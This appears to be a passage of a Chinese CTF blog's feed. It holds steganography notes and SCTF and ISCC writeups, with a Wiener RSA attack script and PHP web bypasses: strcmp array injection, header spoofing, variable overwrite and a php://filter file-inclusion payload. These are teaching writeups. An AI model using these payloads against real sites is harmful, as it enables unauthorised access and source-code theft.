class="line">            wf.write(chr(ord(each) ^ <span class="number">0xff</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    xor()</div></pre></td></tr></table></figure></p><p>得到新的png文件，用hex看文件有提示<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532268180784.png" alt="Alt text"><br>将png分离出来可以用foremost或者直接修改16进制文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/00006777.png" alt="Alt text"><br>观察png文件，可以看到色块分为11列，每列隔行的色块永远是黑色，这说明应该横向读取图片，而列中的横长条由8个小色块组成，显然其代表的是一个字节的数据。<br>提取信息<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg</div><div class="line"></div><div class="line">res_str = []</div><div class="line">res = []</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">readpng</span><span class="params">()</span>:</span></div><div class="line">    png = mpimg.imread(<span class="string">'./00006777.png'</span>)</div><div class="line">    yy, xx, depth = png.shape</div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(yy):</div><div class="line">        <span class="keyword">if</span> y % <span class="number">2</span> == <span class="number">0</span>:</div><div class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, xx - <span class="number">1</span>, <span class="number">9</span>):</div><div class="line">                _str = <span class="string">"0b"</span> + str(int(png[y][x][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">1</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">2</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">3</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">4</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">5</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">6</span>][<span class="number">0</span>])) + str(int(png[y][x + <span class="number">7</span>][<span class="number">0</span>]))</div><div class="line">                res_str.append(_str)</div><div class="line">                res.append(bin2hex(_str))</div><div class="line">    <span class="keyword">print</span> res_str</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'res.bin'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> res:</div><div class="line">            f.write(chr(each))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span><span class="params">(_bin=<span class="string">"0b101"</span>)</span>:</span></div><div class="line">    <span class="keyword">return</span> int(_bin, <span class="number">2</span>) ^ <span class="number">0xFF</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    readpng()</div></pre></td></tr></table></figure></p><p>打开就能看到flag<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272225449.png" alt="Alt text"><br>flag{e0754197-e3ab-4d0d-b98f-96174c378a34}</p><h3 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h3><blockquote><p>巅峰极客 warmup</p></blockquote><p>判断方法大概就是用Stegsolve打开看red plane 0,blue plane 0, green plane 0是不是大致相同，如果是那多半是LSB隐写</p><p>分别提取红绿蓝三个通道的最低位<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272546074.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272557239.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532272567977.png" alt="Alt text"><br>分别是ook 和brainfuck编码 然后解码拼一起就完事<br>flag{db640436-7839-4050-8339-75a972fc553c}</p><blockquote><p>安恒月赛 女神</p></blockquote><p>题目提示弱口令，会误以为压缩包密码为弱口令，结果是隐写口令为弱口令</p><p>打开压缩包发现有密码，旁边有备注<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352386718.png" alt="Alt text"><br>复制备注到sublime，发现是tab和空格，于是猜测为摩斯码，空格为点，tab为横线<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352479146.png" alt="Alt text"><br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532352490146.png" alt="Alt text"><br>解码得到密码，解压后得到图片，用Stegoslove分析应该是LSB隐写，用cloacked-pixel解出flag，密码为弱口令<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1532440300026.png" alt="Alt text"><br>flag{jsy09-wytg5-wius8}</p><h3 id="反色二维码"><a href="#反色二维码" class="headerlink" title="反色二维码"></a>反色二维码</h3><p>有些简单题目用stegsolve就能出二维码不过是反色的<br>比如这种</p><blockquote><p>whalectf Find<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401924732.png" alt="Alt text"></p></blockquote><p>这时候发送到QQ上点击选中就可以扫了<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1533401973178.png" alt="Alt text"></p><h2 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h2><p>第一种是在word内容里隐藏文字<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368015116.png" alt="Alt text"><br>勾选上隐藏文字就可以看到隐写内容。<br>当然也有把文字颜色改为和背景色一样的，还有用图片覆盖的。</p><p>第二种是在xml文件中隐藏<br>用binwalk查看文件或者将文件后缀名改为zip可以解压出xml文件<br><img src="/2018/08/03/CTF中遇到的隐写术总结/1535368372808.png" alt="Alt text"></p><p>未完待添加。。。。。。</p><h2 id="上述题目文件链接"><a href="#上述题目文件链接" class="headerlink" title="上述题目文件链接"></a>上述题目文件链接</h2><p>链接：<a href="https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g" target="_blank" rel="external">https://pan.baidu.com/s/15-U7XAF21hvr7DBq01Rd_g</a> 密码：7r3s</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;图片隐写&quot;&gt;&lt;a href=&quot;#图片隐写&quot; class=&quot;headerlink&quot; title=&quot;图片隐写&quot;&gt;&lt;/a&gt;图片隐写&lt;/h2&gt;&lt;h3 id=&quot;F5隐写&quot;&gt;&lt;a href=&quot;#F5隐写&quot; class=&quot;headerlink&quot; title=&quot;F5隐写&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="ctf" scheme="https://www.twosmi1e.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>SCTF writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/15/SCTF-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/15/SCTF-writeup/</id>
    <published>2018-07-14T17:25:28.000Z</published>
    <updated>2018-08-02T17:32:12.880Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>根据提示用侧信道简单能量分析攻击 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="/2018/07/15/SCTF-writeup/1529508947239.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529510158298.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529508876165.png" alt="Alt text"><br>因为不知道哪个是0哪个是1 然后试了一下</p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="/2018/07/15/SCTF-writeup/1529509226841.png" alt="Alt text"><br><img src="/2018/07/15/SCTF-writeup/1529509154812.png" alt="Alt text"></p><p>按照网上一道类似题的分析，找TCP/IP协议502,102端口<br>追踪TCP流</p><p>SCTF{Easy_Mdbus}</p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>百度找到看雪的一篇分析文章<br>logicdata拖进Logic里面,分析嗅探得到的波形图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x33 0x01 s1</div><div class="line">0x33 0x02 s2</div><div class="line">0x33 0x03 s3</div></pre></td></tr></table></figure></p><p>读出s1, s2, s3</p><p><img src="/2018/07/15/SCTF-writeup/1529509388163.png" alt="Alt text"></p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>用爱奇艺可以拖flash  然后直接拖到最后看了几遍什么都没发现 然后往前翻 发现中间有个过程动画(大概57那里)与那个boss对话中有段base64 解码<br><img src="/2018/07/15/SCTF-writeup/1529509923703.png" alt="Alt text"></p><p><img src="/2018/07/15/SCTF-writeup/1529509417432.png" alt="Alt text"></p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>给出了n, e, c  求m<br>首先尝试了一下分解n,结果太大分解不出来<br><img src="/2018/07/15/SCTF-writeup/1529509597682.png" alt="Alt text"><br>看了一下RSA相关文章 用低解密指数攻击<br><strong>特征：e看起来非常大</strong><br>github 上有RSAwienerHacker 直接下下来跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></div><div class="line">    <span class="string">'''</span></div><div class="line"><span class="string">    Finds d knowing (e,n)</span></div><div class="line"><span class="string">    applying the Wiener continued fraction attack</span></div><div class="line"><span class="string">    '''</span></div><div class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</div><div class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</div><div class="line">    </div><div class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</div><div class="line">        </div><div class="line">        <span class="comment">#check if d is actually the key</span></div><div class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</div><div class="line">            phi = (e*d<span class="number">-1</span>)//k</div><div class="line">            s = n - phi + <span class="number">1</span></div><div class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></div><div class="line">            <span class="comment"># has integer roots</span></div><div class="line">            discr = s*s - <span class="number">4</span>*n</div><div class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</div><div class="line">                t = Arithmetic.is_perfect_square(discr)</div><div class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</div><div class="line">                    print(<span class="string">"Hacked!"</span>)</div><div class="line">                    <span class="keyword">return</span> d</div><div class="line"></div><div class="line"><span class="comment"># TEST functions</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_hack_RSA</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">"Testing Wiener Attack"</span>)</div><div class="line">    times = <span class="number">5</span></div><div class="line">    </div><div class="line">    <span class="keyword">while</span>(times&gt;<span class="number">0</span>):</div><div class="line"></div><div class="line"></div><div class="line">        e,n,d = RSAvulnerableKeyGenerator.generateKeys(<span class="number">1024</span>)</div><div class="line">        print(<span class="string">"(e,n) is ("</span>, e, <span class="string">", "</span>, n, <span class="string">")"</span>)</div><div class="line">        print(<span class="string">"d = "</span>, d)</div><div class="line">    </div><div class="line">        hacked_d = hack_RSA(e, n)</div><div class="line">    </div><div class="line">        <span class="keyword">if</span> d == hacked_d:</div><div class="line">            print(<span class="string">"Hack WORKED!"</span>)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print(<span class="string">"Hack FAILED"</span>)</div><div class="line">        </div><div class="line">        print(<span class="string">"d = "</span>, d, <span class="string">", hacked_d = "</span>, hacked_d)</div><div class="line">        print(<span class="string">"-------------------------"</span>)</div><div class="line">        times -= <span class="number">1</span></div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="comment">#test_is_perfect_square()</span></div><div class="line">    <span class="comment">#print("-------------------------")</span></div><div class="line">    test_hack_RSA()</div><div class="line"></div><div class="line">n = <span class="number">356096033429997161372356441930246707554046995590506452306084931488519008238592151695866774341246347160182054216879883209187019942641996111166252052256475412435016177136773967956292472785118669272929844214105480922945372638910276569650465033695573697459823872295312452877368652943145314840314022954151337366463</span></div><div class="line">e = <span class="number">160222447153262895889250928158012827757109871196102040037421857250766491575699886894325697077956068896677359953037375582060511979328323570880578946073240834317364119936983046746942944368567355131867682895196198904859001202051459879133425754080440276218324680838480108302184726980362910704693149535052743526713</span></div><div class="line">c = <span class="number">147196512678165362278479859274730376684762864061315836792770099383278172248558388764516679102190414689292831454764081139184450400390951627813402530351267384900672105846731222258018693047922255488857215383862135296386187138430843389538652580147662346075434257219061071710799682137566072656776621262987516040147</span></div><div class="line">d = hack_RSA(e, n)</div><div class="line">print(d)</div><div class="line">m = pow(c, d, n)</div><div class="line">print(m)</div><div class="line">print(<span class="string">'%#x'</span>%m)</div></pre></td></tr></table></figure></p><p><img src="/2018/07/15/SCTF-writeup/1529509732002.png" alt="Alt text"><br>提交十进制十六进制都不对，转一下十六进制<br><img src="/2018/07/15/SCTF-writeup/1529509833971.png" alt="Alt text"><br>get flag</p><blockquote><p>贴个官方WP</p></blockquote><p><a href="https://www.xctf.org.cn//media/infoattach/38405dd3f67e4d3e93c5d5042ff14909.pdf" target="_blank" rel="external">SCTF官方WP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h2&gt;&lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="wp" scheme="https://www.twosmi1e.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ISCC writeup</title>
    <link href="https://www.twosmi1e.com/2018/07/01/ISCC-writeup/"/>
    <id>https://www.twosmi1e.com/2018/07/01/ISCC-writeup/</id>
    <published>2018-07-01T09:45:32.000Z</published>
    <updated>2018-08-02T17:26:16.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC-WP"><a href="#ISCC-WP" class="headerlink" title="ISCC WP"></a>ISCC WP</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>图片隐写给了一张这个图<br><img src="/2018/07/01/ISCC-writeup/1525678030342.png" alt="Alt text"></p><p>然后看手指指的地方应该就是flag  改高度<br><img src="/2018/07/01/ISCC-writeup/1525678281836.png" alt="Alt text"></p><p>IHDR后的前八个字节为宽度（第二排00 00 02 72），接下来八个为高度，将高度改为和宽度一样得到flag<br><img src="/2018/07/01/ISCC-writeup/WhatIsThat1.png" alt="Alt text"></p><h3 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h3><p>给了一个txt内容是：<br>秘密电报：<br>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA<br>刚开始以为是摩斯密码结果没有分割符，直接复制百度，是培根密码然后在线解密得到flag</p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。<br>一看题目肯定有凯撒密码，移位13得到roqtp697t95j3，然后是学会使用键盘，应该是键盘加密，刚开始以为是围成什么图案或者是围起来的字母，后面发现按键盘往下移一排就是flag<br>得到flag:yougotme</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>前端代码控制的直接浏览器改一下<strong>maxlength</strong>就好了，客户端的限制一般都很好过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">maxlength</span>=<span class="string">"3"</span> <span class="attr">name</span>=<span class="string">"v"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></div></pre></td></tr></table></figure></p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">'2.php'</span>);</div><div class="line">$flag=<span class="string">'&#123;***************&#125;'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;  </div><div class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)  </div><div class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);  </div><div class="line">    <span class="keyword">else</span>  </div><div class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;  </div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>PHP的strcmp漏洞，另一篇博客里面有，传个数组就可以get flag<br><img src="/2018/07/01/ISCC-writeup/1525692789515.png" alt="Alt text"></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><img src="/2018/07/01/ISCC-writeup/1525692860618.png" alt="Alt text"><br>burp抓包改一下XFW或者HOST就可以了</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><img src="/2018/07/01/ISCC-writeup/1525693740896.png" alt="Alt text"><br>callback的后面有一串url和base64的编码，把base64那部分解码出来<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA</div><div class="line"> &lt;script&gt;alert(<span class="string">"key:/%nsfocusXSStest%/"</span>)&lt;<span class="regexp">/scrip</span></div></pre></td></tr></table></figure></p><p>中间的key部分就是答案，我还一直在那里测xss测了半天，没想到这么坑，而且提交的时候只用key冒号后面的内容<br><img src="/2018/07/01/ISCC-writeup/1525693998162.png" alt="Alt text"></p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>Tip：好像有个文件忘记删了<br>可以想到是后台文件没删或者源码泄露，扫了下后台，试了下svn都没收获。然后py了一下原来是没删txt文件，直接输入<a href="http://118.190.152.202:8009/index.php.txt就可以读源码了" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt就可以读源码了</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] != <span class="string">"POST"</span>)</div><div class="line"><span class="keyword">die</span>(<span class="string">"flag is here"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">"flag"</span>]) )</div><div class="line"><span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">$$k = $$v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k =&gt; $v)&#123;</div><div class="line">$$k = $v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ( $_POST[<span class="string">"flag"</span>] !== $flag )</div><div class="line"><span class="keyword">die</span>($_403);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"flag: "</span>. $flag . <span class="string">"\n"</span>;</div><div class="line"><span class="keyword">die</span>($_200);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span>()是数组的迭代方法</div><div class="line"><span class="keyword">foreach</span>(array_expression <span class="keyword">as</span> $key =&gt; $value)每次循环中键值也会赋给$key</div></pre></td></tr></table></figure><p>分析源码，$flag应该是flag.php中的变量就是所找的答案，而最后的一个if语句执行判断，POSTflag后echo出flag，可以通过foreach的变量覆盖绕过，而要得到flag就需要从另一个输出点输出原本的flag变量。</p><p>为了方便理解我们在本地修改源码将变量值打印出来</p><p>payload1：<br><img src="/2018/07/01/ISCC-writeup/1525847512296.png" alt="Alt text"><br>可以看出第一个foreach里将<strong>\$flag</strong>的值赋给了<strong>\$_200</strong>，第二个foreach将上传的flag值赋给<strong>\$flag</strong>，从而通过后面的if判断，然后<strong>die(\$_200)</strong>输出flag内容。<br>payload2:<br><img src="/2018/07/01/ISCC-writeup/1525849178524.png" alt="Alt text"><br>第二种将<strong>\$flag</strong>的值赋给了<strong>\$_403</strong>，同时给<strong>\$_POST</strong>赋一个值使if判断成立输出<strong>\$_403</strong>，如果只给403赋值的话效果如下<br><img src="/2018/07/01/ISCC-writeup/1525849330422.png" alt="Alt text"></p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p><img src="/2018/07/01/ISCC-writeup/1525694416084.png" alt="Alt text"><br>刚开始看到ID以为是SQL注入，看到<strong>f=articles</strong>才反应过来读取本地文件应该是文件包含吧（之后应该找个时间总结一下文件包含和php伪协议，挖坑ing）<br>然后用php://协议<br>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);</div><div class="line"># payload</div><div class="line">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=1</div></pre></td></tr></table></figure></p><p><img src="/2018/07/01/ISCC-writeup/1525694700020.png" alt="Alt text"><br>然后base64解码得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt; </div><div class="line">&lt;html lang=&quot;en&quot;&gt; </div><div class="line">&lt;head&gt;</div><div class="line">     &lt;title&gt;?????????&lt;/title&gt;</div><div class="line">          &lt;meta charset=&quot;UTF-8&quot;&gt;</div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt;</div><div class="line">     &lt;a href=&apos;index.php?f=articles&amp;id=1&apos;&gt;ID: 1&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=2&apos;&gt;ID: 2&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=3&apos;&gt;ID: 3&lt;/href&gt;     &lt;/br&gt;     &lt;a href=&apos;index.php?f=articles&amp;id=4&apos;&gt;ID: 4&lt;/href&gt;     &lt;/br&gt; &lt;/body&gt; &lt;/html&gt;  </div><div class="line"></div><div class="line">&lt;?php     #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;     </div><div class="line">if(isset($_GET[&apos;f&apos;]))&#123;         </div><div class="line">if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</div><div class="line">             die(&quot;error...&quot;);</div><div class="line">&#125;         </div><div class="line">else&#123;             </div><div class="line">include($_GET[&apos;f&apos;] . &apos;.php&apos;);</div><div class="line">&#125;     </div><div class="line">&#125;      </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><img src="/2018/07/01/ISCC-writeup/1525694803250.png" alt="Alt text"><br>跟前面的一道比较类似吧，不过这道加<strong>X-Forward-For</strong>似乎没有用，加了<strong>client-ip</strong>后得到flag<br><img src="/2018/07/01/ISCC-writeup/1525694876173.png" alt="Alt text"></p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>按提示随便传个用户名和密码<br><img src="/2018/07/01/ISCC-writeup/1525695240838.png" alt="Alt text"><br>然后看注释又是index.php.txt,然后读源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">"***********"</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (<span class="number">0</span> == strcasecmp($flag,$_GET[<span class="string">'username'</span>]))&#123;</div><div class="line">$a = fla;</div><div class="line"><span class="keyword">echo</span> <span class="string">"very good!Username is right"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">print</span> <span class="string">'Username is not right&lt;!--index.php.txt--&gt;'</span>;&#125;</div><div class="line">&#125;<span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Please give me username or password!'</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (is_numeric($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line"><span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">4</span>)&#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span 